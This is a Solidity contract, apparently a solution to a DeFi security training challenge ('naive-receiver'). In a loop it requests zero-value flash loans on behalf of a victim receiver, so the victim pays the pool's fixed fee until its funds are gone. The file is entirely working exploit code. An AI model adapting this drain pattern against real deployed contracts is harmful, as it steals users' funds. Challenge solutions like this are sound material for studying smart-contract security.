// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

/**
@dev Repeatedly call for a valueless flashloan on behalf of the vitcim,
paying the large fee until their funds are empty.
 */
contract Attacker {
    address private flashLoanReceiver;
    NaiveReceiverLenderPool private pool;

    constructor(address _flashLoanReceiver, address payable _pool) {
        flashLoanReceiver = _flashLoanReceiver;
        pool = NaiveReceiverLenderPool(_pool);
    }

    function attack() public {
        while (flashLoanReceiver.balance >= pool.fixedFee()) {
            pool.flashLoan(flashLoanReceiver, 0);
        }
    }
}
